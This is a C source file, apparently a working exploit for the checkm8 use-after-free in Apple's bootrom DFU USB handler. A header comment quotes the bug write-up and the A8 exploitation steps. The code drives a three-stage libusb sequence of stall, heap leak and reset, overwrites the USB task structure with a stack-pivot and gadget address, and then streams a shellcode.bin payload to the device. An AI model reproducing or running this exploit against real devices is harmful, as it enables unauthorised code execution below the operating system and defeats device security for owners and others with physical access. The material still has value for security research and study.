#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libusb.h>
#include <unistd.h>
#include <fcntl.h>

#define VND_APPLE  0x05ac
#define DEV_DFU    0x1227
#define DEV_IPHONE 0x12A8

#define LEAKS 5

/*
https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4

This bug was also called moonshine in the beginning
Basically the following bug is present in all bootroms I have looked at:

1. When usb is started to get an image over dfu, dfu registers an interface to
   handle all the commands and allocates a buffer for input and output

2. if you send data to dfu the setup packet is handled by the main code which
   then calls out to the interface code

3. the interface code verifies that wLength is shorter than the input output
   buffer length and if that's the case it updates a pointer passed as an
   argument with a pointer to the input output buffer

4. it then returns wLength which is the length it wants to recieve into the
   buffer

5. the usb main code then updates a global var with the length and gets ready to
   recieve the data packages

6. if a data package is recieved it gets written to the input output buffer via
   the pointer which was passed as an argument and another global variable is
   used to keep track of how many bytes were recieved already

7. if all the data was recieved the dfu specific code is called again and that
   then goes on to copy the contents of the input output buffer to the memory
   location from where the image is later booted

8. after that the usb code resets all variables and goes on to handel new
   packages

9. if dfu exits the input output buffer is freed and if parsing of the image
   fails bootrom reenters dfu

Exiting dfu can either be done by sending a dfu abort package or by triggering
parsing with a usb reset

The problem:
At step 5 the global variables are updated and the bootrom gets ready to recieve
the data, but with a cheap controller you can violate the usb spec and don't
send any (arduino host controller or sth like that).

Then you can trigger a usb reset to trigger image parsing. If that parsing fails
bootrom will enter dfu once again, BUT step 8 wasn't executed so the global
variables still contain all the values.

However step 9 was executed so the input output buffer is freed while the
pointer which was passed as an argument in step 3 still points to it.

Because of that you can easily trigger a write to an already freed buffer by
sending data to the device.

Exploitation on A8:
1. Send 0x40 of random data to dfu, this has to be sent otherwise you can't exit
   dfu using usb reset ctrlReq(bmRequestType = 0x21,bRequest = 1,wLength = 0x40)

2. get dfu in the state where it's waiting for a usb reset by sending
   ctrlReq(0x21,1,0) ctrlReq(0xa1,3,1) ctrlReq(0xa1,3,1) ctrlReq(0xa1,3,1) (see
   ipwndfu dfu.py)

3. only sent a setup packet with bmRequestType 0x21 and bRequest 1 and a wLength
   of your payload size (this one will update the global variables)

4. send a status packet to mark the end of the controll transfer (we skipped the
   data phase even tho we set wLength to a value)

5. trigger bus reset

6. wait for the device to reenter dfu (now the input output buffer will be freed
   and the usb task will be allocated under the freed buffer)

7. send a set configuration request
   ctrlReq(bmREQ_SET,USB_REQUEST_SET_CONFIGURATION,wLength=Payloadsize) but send
   the payload with it as data phase (set configuration handler in bootrom
   ignores wLength)

The payload will overwrite the usb task struct and the next allocation after it
will be the usb stack. By targeting the linked list in the usb task struct you
can insert a fake task.

And you can use the usb task stack as scratch space as it seems like it will
never end up writing to it that high.

That one will be spawned when dfu exits and the usb task gets stopped. So you
can send a dfu abort packet after step 7 and with that get code exec with all
higher registers controlled because your fake task gets added to the list and
runs at some point later on.

~ 31.05.19 lailo
*/

/*
# T8010 (buttons)   NEW: 0.68 seconds
version:    'IBoot-2696.0.0.1.33'
cpid:       0x8010
large_leak: None
overwrite:  t8010_overwrite
            '\0' * 0x580 +
	    struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
hole:       5
leak:       1
*/

int stall(libusb_device_handle *handle)
{
	char buffer[0xC8];
	struct libusb_transfer *transfer;

	libusb_fill_control_setup(buffer, LIBUSB_ENDPOINT_IN,
	LIBUSB_REQUEST_GET_DESCRIPTOR, 0x0304, 0x040A, 0xC0);

	transfer = libusb_alloc_transfer(1);
	libusb_fill_control_transfer(transfer, handle, buffer, NULL, NULL, 0);

	if(0 != libusb_submit_transfer(transfer)) {
		perror("libusb_submit_transfer");
		exit(1);
	}

	if(0 != libusb_cancel_transfer(transfer)) {
		perror("libusb_cancel_transfer");
		exit(1);
	}

	return 0;
}

/* For the two following functions: it is faster to esnd a raw control URB
 * rather than send a string descriptor request with libusb. Here, because the
 * device is "frozen", it will wait 1 second for a response to come. But it will
 * not come.
 */
int no_leak(libusb_device_handle *handle)
{
	/* Any size that is > 0xC0 ? */
	return libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN,
				       LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304, 0,
				       NULL, 0xC1, 1);
}


int leak(libusb_device_handle *handle)
{
	return libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN,
				       LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304, 0,
				       NULL, 0xC0, 1);
}

void stage1(libusb_device_handle *handle)
{
	/* stall: send a request, but abort quickly */
	if(0 > stall(handle)) {
		perror("stall");
		exit(EXIT_FAILURE);
	}

	/* no_leak: ? */
	for(int i = 0; i < LEAKS; i++) {
		/* Retrieves the serial number ? */
		no_leak(handle);
	}

	/* leak: ? size of 0xC0, maybe a placeholder object */
	if(0 > leak(handle)) {
		perror("leak");
	}
	no_leak(handle);

	if(0 != libusb_reset_device(handle)) {
		perror("libusb_reset_device");
	}
}

void async(libusb_device_handle *handle)
{
	char buffer[0x808] = {0};
	struct libusb_transfer *transfer;

	libusb_fill_control_setup(buffer, 0x21, 1, 0, 0, sizeof(buffer) - 8);

	transfer = libusb_alloc_transfer(1);
	libusb_fill_control_transfer(transfer, handle, buffer, NULL, NULL, 0);
	libusb_submit_transfer(transfer);

	/* This spin lock "waits" for the device to send 0x40 bytes.
	 * Less bytes won't work. More bytes won't work. Don't ask me. */
	for(int i = 0; i < 5e3; i++)
		;

	libusb_cancel_transfer(transfer);
}

void stage2(libusb_device_handle *handle)
{
	async(handle);
	libusb_control_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 0);
}

void stage3(libusb_device_handle *handle, int fd)
{
	char buffer[0x800] = {0};

	size_t i;
	ssize_t size;

	/* usb_req_stall: read spanish iSerialNumber */
	if(0 > libusb_control_transfer(handle, 2, 3, 0, 0x80, NULL, 0, 10)) {
		perror("libusb_contorl_transfer");
	}

	if(0 > libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN, 6, 0x304, 0x40A, buffer, 0x40, 1)) {
		perror("usb_req_leak");
	}

	memset(buffer, 0, 0x5A0);
	*((uint64_t*)(buffer + 0x5A0)) = 0x10000CC6C; // stack pivot
	*((uint64_t*)(buffer + 0x5A8)) = 0x1800B0800; // ?
	libusb_control_transfer(handle, LIBUSB_ENDPOINT_OUT, 0, 0, 0, buffer, 0x5B0, 0);

	while(0 < (size = read(fd, buffer, sizeof(buffer))))
		libusb_control_transfer(handle, 0x21, 1, 0, 0, buffer, size, 10);

	if(0 != libusb_reset_device(handle)) {
		perror("libusb_reset_device");
	}
}

int main(int argc, char* argv[])
{
	int fd;

	libusb_context *ctx;
	libusb_device_handle *handle;
	libusb_device *dev;
	struct libusb_device_descriptor desc;
	struct libusb_config_descriptor *config;

	char buffer[128];
	int size;

	int ret;

	ret = EXIT_FAILURE;

	if(0 > (fd = open("shellcode.bin", O_RDONLY))) {
		perror("open(shellcode.bin)");
		return EXIT_FAILURE;
	}

	/* create a context */
	if(0 != libusb_init(&ctx)) {
		perror("libusb_init");
		goto clean0;
	}

	/* Find the correct device by vendore id/device id */
	handle = libusb_open_device_with_vid_pid(ctx, VND_APPLE, DEV_DFU);
	if(NULL == handle) {
		perror("libusb_open_device_with_vid_pid");
		goto clean1;
	}

	/* Get the device (generic object) */
	dev = libusb_get_device(handle);
	if(NULL == dev) {
		perror("libusb_get_device");
		goto clean2;
	}

	/* Should never fail */
	if(0 != libusb_get_device_descriptor(dev, &desc)) {
		perror("libusb_get_device_descriptor");
		goto clean2;
	}

	/* Retrieve seial number */
	size = libusb_get_string_descriptor_ascii(handle, desc.iSerialNumber,
	                                          buffer, sizeof(buffer));
	printf("SerialNumber[%d]: %s\n", size, buffer);

	/* Claim interface (allows for talking to it) */
	if(0 != libusb_claim_interface(handle, 0)) {
		perror("libusb_claim_interface 1");
		goto clean2;
	}

	stage1(handle);

	libusb_release_interface(handle, 0);
	libusb_close(handle);

	/* Find the correct device by vendore id/device id */
	handle = libusb_open_device_with_vid_pid(ctx, VND_APPLE, DEV_DFU);
	if(NULL == handle) {
		perror("libusb_open_device_with_vid_pid");
		goto clean1;
	}

	/* Claim interface (allows for talking to it) */
	if(0 != libusb_claim_interface(handle, 0)) {
		perror("libusb_claim_interface 2");
		goto clean2;
	}

	stage2(handle);

	libusb_release_interface(handle, 0);
	libusb_close(handle);

	usleep(5e5);

	/* Find the correct device by vendore id/device id */
	handle = libusb_open_device_with_vid_pid(ctx, VND_APPLE, DEV_DFU);
	if(NULL == handle) {
		perror("libusb_open_device_with_vid_pid");
		goto clean1;
	}

	/* Claim interface (allows for talking to it) */
	if(0 != libusb_claim_interface(handle, 0)) {
		perror("libusb_claim_interface 3");
		goto clean2;
	}

	stage3(handle, fd);

	ret = EXIT_SUCCESS;
clean3:
	libusb_release_interface(handle, 0);

clean2:
	libusb_close(handle);

clean1:
	libusb_exit(ctx);

clean0:
	close(fd);
	return ret;
}
